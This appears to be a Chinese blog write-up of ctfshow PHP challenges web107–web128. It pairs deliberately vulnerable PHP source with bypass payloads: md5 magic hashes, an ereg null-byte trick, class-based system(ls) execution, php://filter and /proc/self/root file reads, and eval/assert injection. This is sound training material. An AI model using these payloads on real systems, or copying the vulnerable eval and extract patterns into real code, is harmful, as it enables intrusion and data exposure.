+<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br><br>if(isset($_POST[&#x27;v1&#x27;]))&#123;<br>    $v1 = $_POST[&#x27;v1&#x27;];<br>    $v3 = $_GET[&#x27;v3&#x27;];<br>       parse_str($v1,$v2);<br>       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;<br>           echo $flag;<br>       &#125;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">parse_str()函数就是把v1的解析赋值给v2<br></code></pre></td></tr></table></figure>
+
+<p>我们要让<code>v2[&#39;flag&#39;]==md5(v3)</code>那我就有个想法，v2不是个数组吗，那我们给v3也传个数组，那不就和上一题一样的数组绕过了吗，v1随便传点啥都行</p>
+<p>还有其他解法，比如我们只要满足v3的md5等于v2[flag]即可。可以传递给v3任意值，然后v1&#x3D;flag&#x3D;v3的md5值。</p>
+<p>payload：?v3&#x3D;flag post: v1&#x3D;flag&#x3D;327a6c4304ad5938eaf0efb6cc3e53dc</p>
+<p>又或者v3&#x3D;QNKCDZO; v1&#x3D;flag&#x3D;0 因为MD50e可以绕过</p>
+<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br><br>if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;<br>    die(&#x27;error&#x27;);<br><br>&#125;<br>//只有36d的人才能看到flag<br>if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;<br>    echo $flag;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>一个关于erge()的漏洞，<code>ereg</code> 遇到 NULL字节会截断检查，其中 <code>%00</code> 是URL编码的NULL字节，所以被检测的就只有前面的<code>%00</code>部分，strrev() 函数会反转字符串，<code>0x36d</code>&#x3D;877，那我们就可以构造payload：<code>?c=a%00778</code></p>
+<h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;<br>            eval(&quot;echo new $v1($v2());&quot;);<br>    &#125;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>代码看的懂但不会做，就是说使用正则表达式函数 <code>preg_match()</code> 来检查变量 <code>$v1</code> 和 <code>$v2</code> 是否包含至少一个字母。如果两者都满足条件，则执行 <code>eval()</code> 函数，将 <code>$v2()</code> 执行的结果作为参数创建一个新的 <code>$v1</code> 类对象，并通过 <code>echo</code> 输出。</p>
+<p>看看wp吧，要使用内置类,还有个知识点，<code>php中只要是变量后面紧跟着()，就会对这个变量进行函数调用</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;使用php自带的内置方法&#125;<br>&#123;在php官方文档找到带有::__toString的后缀，这种是类&#125;<br>&#123;我把带__toString的函数罗列一些出来&#125;<br>CachingIterator::__toString()<br>DirectoryIterator::__toString<br>Error::__toString<br>Exception::__toString<br>pyload:<br>?v1= CachingIterator&amp;v2=system(ls)<br>?v1= DirectoryIterator&amp;v2=system(ls)<br>?v1= Error&amp;v2=system(ls)<br>?v1= Exception&amp;v2=system(ls)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/~|`|\!|\@|\#|\\$|\%|\^|\&amp;|*|\(|\)|_|\-|\+|=|\&#123;|[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;<br>            die(&quot;error v1&quot;);<br>    &#125;<br>    if(preg_match(&#x27;/~|`|\!|\@|\#|\\$|\%|\^|\&amp;|*|\(|\)|_|\-|\+|=|\&#123;|[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;<br>            die(&quot;error v2&quot;);<br>    &#125;<br><br>    eval(&quot;echo new $v1($v2());&quot;);<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>payload:?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
+<p>解释：在PHP中，<code>FilesystemIterator</code> 类是 <code>IteratorIterator</code> 类的一个子类，它用于遍历目录结构中的文件和目录。<code>FilesystemIterator</code> 类提供了对文件系统中的文件和目录进行迭代的能力，这使得开发者可以轻松地遍历文件夹及其子文件夹中的内容。<strong><code>getcwd()</code> 的主要功能是获取当前工作目录的绝对路径。</strong></p>
+<p>类<code>FilesystemIterator</code>可以用来遍历目录，需要一个路径参数</p>
+<p>函数<code>getcwd</code>可以返回当前工作路径且不需要参数，所以就有了这个payload</p>
+<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>highlight_file(__FILE__);<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br><br>function getFlag(&amp;$v1,&amp;$v2)&#123;<br>    eval(&quot;$$v1 = &amp;$$v2;&quot;);<br>    var_dump($$v1);<br>&#125;<br><br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/~| |`|\!|\@|\#|\\$|\%|\^|\&amp;|*|\(|\)|_|\-|\+|=|\&#123;|[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;<br>            die(&quot;error v1&quot;);<br>    &#125;<br>    if(preg_match(&#x27;/~| |`|\!|\@|\#|\\$|\%|\^|\&amp;|*|\(|\)|_|\-|\+|=|\&#123;|[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;<br>            die(&quot;error v2&quot;);<br>    &#125;<br>    <br>    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;<br>            getFlag($v1,$v2);<br>    &#125;<br>    <br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>老话，看见这个咱就应该想到变量覆盖，把v2的地址给v1</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">eval(&quot;$$v1 = &amp;$$v2;&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>然后我们来审计一下代码，需要v1&#x3D;ctfshow才能触发getFlag，v1和v2都只能输入字母，额，那v1就只能是ctfshow，</p>
+<p>那我们想一下什么玩意能作用于全局呢，全局变量啊，而且又是赋值地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$GLOBALS 是一个超全局变量，在 PHP 中用于访问全局作用域内的所有变量。这个超全局变量实际上是一个包含所有全局变量的数组。你可以通过 $GLOBALS 数组来访问和修改全局作用域中的任何变量，即使在函数或方法内部。<br></code></pre></td></tr></table></figure>
+
+<p>那我们就有了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">/?v1=ctfshow&amp;v2=GLOBALS <br></code></pre></td></tr></table></figure>
+
+<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>highlight_file(__FILE__);<br>error_reporting(0);<br>function filter($file)&#123;<br>    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;<br>        die(&quot;hacker!&quot;);<br>    &#125;else&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET[&#x27;file&#x27;];<br>if(! is_file($file))&#123;<br>    highlight_file(filter($file));<br>&#125;else&#123;<br>    echo &quot;hacker!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>额，过滤了一些data啥的，但是我们还有php:&#x2F;&#x2F;filter</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:?file=php://filter/convert.quoted-printable-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<p>这个就行，不加过滤应该也行</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?file=php://filter/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">php://filter/resource=flag.php<br>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php<br>php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>compress.zlib://flag.php  #这些都行<br></code></pre></td></tr></table></figure>
+
+<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>function filter($file)&#123;<br>    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;<br>        die(&#x27;hacker!&#x27;);<br>    &#125;else&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET[&#x27;file&#x27;];<br>if(! is_file($file))&#123;<br>    highlight_file(filter($file));<br>&#125;else&#123;<br>    echo &quot;hacker!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>额，我们的filter被过滤掉了，我们可以使用<code>compress.zlib://flag.php</code>，就是说zip协议绕过，这个是官网给的<a target="_blank" rel="noopener" href="https://www.php.net/manual/es/wrappers.compression.php">https://www.php.net/manual/es/wrappers.compression.php</a></p>
+<p>然后看看发现官方的payload不是这个</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p<br>roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro<br>c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/<br>self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se<br>lf/root/proc/self/root/var/www/html/flag.php<br></code></pre></td></tr></table></figure>
+
+<p>这里是运用了目录溢出</p>
+<h4 id="proc-self-root-的作用"><a href="#proc-self-root-的作用" class="headerlink" title="/proc/self/root 的作用"></a><strong><code>/proc/self/root</code></strong> <strong>的作用</strong></h4><ul>
+<li><strong><code>/proc/self</code></strong>：是一个指向当前进程（即访问该路径的进程）的符号链接。例如，若当前进程 PID 是 <code>1234</code>，则 <code>/proc/self</code> 等效于 <code>/proc/1234</code>。</li>
+<li><strong><code>/proc/[pid]/root</code></strong>：是进程的根目录（<code>/</code>）的符号链接。对于未使用 <code>chroot</code> 的普通进程，<code>/proc/self/root</code> 指向系统的根目录 <code>/</code>。</li>
+</ul>
+<p><strong>核心原理</strong>是：<br>通过反复插入 <code>/proc/self/root</code>（指向系统根目录 <code>/</code> 的符号链接），最终等效于直接访问 <code>/var/www/html/flag.php</code>。</p>
+<p>但因为太长了，导致is_file认为它不是一个文件，就成功绕过了</p>
+<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>function filter($file)&#123;<br>    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;<br>        die(&#x27;hacker!&#x27;);<br>    &#125;else&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET[&#x27;file&#x27;];<br>echo &quot;师傅们居然tql都是非预期 哼！&quot;;<br>if(! is_file($file))&#123;<br>    highlight_file(filter($file));<br>&#125;else&#123;<br>    echo &quot;hacker!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这题没过滤filter，直接</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:?file=php://filter/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&#x27;flag.php&#x27;);<br>highlight_file(__FILE__);<br>error_reporting(0);<br>function filter($num)&#123;<br>    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);<br>    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);<br>    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);<br>    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);<br>    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);<br>    return $num;<br>&#125;<br>$num=$_GET[&#x27;num&#x27;];<br>if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;<br>    if($num==&#x27;36&#x27;)&#123;<br>        echo $flag;<br>    &#125;else&#123;<br>        echo &quot;hacker!!&quot;;<br>    &#125;<br>&#125;else&#123;<br>    echo &quot;hacker!!!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们来观察一下这个题目，首先num要是个数字，然后强比较不等于36，再然后去除首尾空格后的字符串不能是36，</p>
+<p>最后经过filter，将那些都替换成1</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:?num=%0c36<br></code></pre></td></tr></table></figure>
+
+<p>这里解释一下%0c是换页符，为的是让强比较那边过去</p>
+<h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>$a=$_SERVER[&#x27;argv&#x27;];<br>$c=$_POST[&#x27;fun&#x27;];<br>if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;<br>    if(!preg_match(&quot;/\\\\|\/|~|`|\!|\@|\#|\%|\^|*|\-|\+|=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;<br>         eval(&quot;$c&quot;.&quot;;&quot;);  <br>         if($fl0g===&quot;flag_give_me&quot;)&#123;<br>             echo $flag;<br>         &#125;<br>    &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>咱们直接看到这行，需要传两个参，然后不能传参给fl0g</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;])<br></code></pre></td></tr></table></figure>
+
+<p>然后我们可以看到CTF_SHOW.COM这个是个非法传参，会把不符合条件的符号给转换为下划线但是只能转换一次，我们可以对他使用类似于双写绕过的方法CTF[SHOW.COM这样就出现了两个不合法字符，也就只会转换一个为下划线。</p>
+<p>然后我们传个参数给$c（因为我们已经有了eval(),所以能直接使用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>$a=$_SERVER[&#x27;argv&#x27;];<br>$c=$_POST[&#x27;fun&#x27;];<br>if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;<br>    if(!preg_match(&quot;/\\\\|\/|~|`|\!|\@|\#|\%|\^|*|\-|\+|=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;<br>         eval(&quot;$c&quot;.&quot;;&quot;);<br>         if($fl0g===&quot;flag_give_me&quot;)&#123;<br>             echo $flag;<br>         &#125;<br>    &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>大事不妙，过滤了好多东西，但我们发现highlight_file()没被过滤那我们可以这样子</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：GET:?1=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])<br></code></pre></td></tr></table></figure>
+
+<h3 id="web126（思"><a href="#web126（思" class="headerlink" title="web126（思"></a>web126（思</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br>$a=$_SERVER[&#x27;argv&#x27;];<br>$c=$_POST[&#x27;fun&#x27;];<br>if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;<br>    if(!preg_match(&quot;/\\\\|\/|~|`|\!|\@|\#|\%|\^|*|\-|\+|=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;<br>         eval(&quot;$c&quot;.&quot;;&quot;);  <br>         if($fl0g===&quot;flag_give_me&quot;)&#123;<br>             echo $flag;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们可以看到过滤了好多东西，很有意思啊，我们终于可以用用到$a&#x3D;$<code>_SERVER[&#39;argv&#39;];</code>了（也没啥其他的用的了）</p>
+<p>先多提一嘴<code>parse_str — 将字符串解析成多个变量</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">a=_SERVER[&#x27;argv&#x27;];传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string<br>在网页模式下（通过浏览器访问 PHP 脚本），$_SERVER[&#x27;argv&#x27;] 通常不包含有用的信息，因为网页请求没有命令行参数。有时服务器配置会将查询字符串或其他信息填充到 $_SERVER[&#x27;argv&#x27;] 中。<br>bool assert( mixed $assertion[, Throwable $exception] )<br>如果 填入的assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：GET:?a=1+fl0g=flag_give_me POST:fun=CTF%5BSHOW.COM=2&amp;CTF_SHOW=1&amp;fun=parse_str($a[1])  //通过加号 + 分割 argv 成多个部分，也是为了得到 fl0g=flag_give_me ，其中 parse_str() 函数用来把查询字符串解析到变量中。<br>或者<br>GET:?$fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])<br>或者post:fun=eval($_REQUEST[m])&amp;m=$fl0g%3d&quot;flag_give_me&quot;;&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=1<br></code></pre></td></tr></table></figure>
+
+<h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>$ctf_show = md5($flag);<br>$url = $_SERVER[&#x27;QUERY_STRING&#x27;];<br><br>//特殊字符检测<br>function waf($url)&#123;<br>    if(preg_match(&#x27;/`|~|\!|\@|\#|\^|*|\(|\)|\\$|_|\-|\+|\&#123;|\;|\:|[|]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;<br>        return true;<br>    &#125;else&#123;<br>        return false;<br>    &#125;<br>&#125;<br><br>if(waf($url))&#123;<br>    die(&quot;嗯哼？&quot;);<br>&#125;else&#123;<br>    extract($_GET);<br>&#125;<br><br>if($ctf_show===&#x27;ilove36d&#x27;)&#123;<br>    echo $flag;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>考察全局变量，直接ctf_show&#x3D;ilove36d不行因为过滤了_,那我们可以利用不合法变量名来绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:?ctf%20show=ilove36d<br></code></pre></td></tr></table></figure>
+
+<h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br>$f1 = $_GET[&#x27;f1&#x27;];<br>$f2 = $_GET[&#x27;f2&#x27;];<br><br>if(check($f1))&#123;<br>    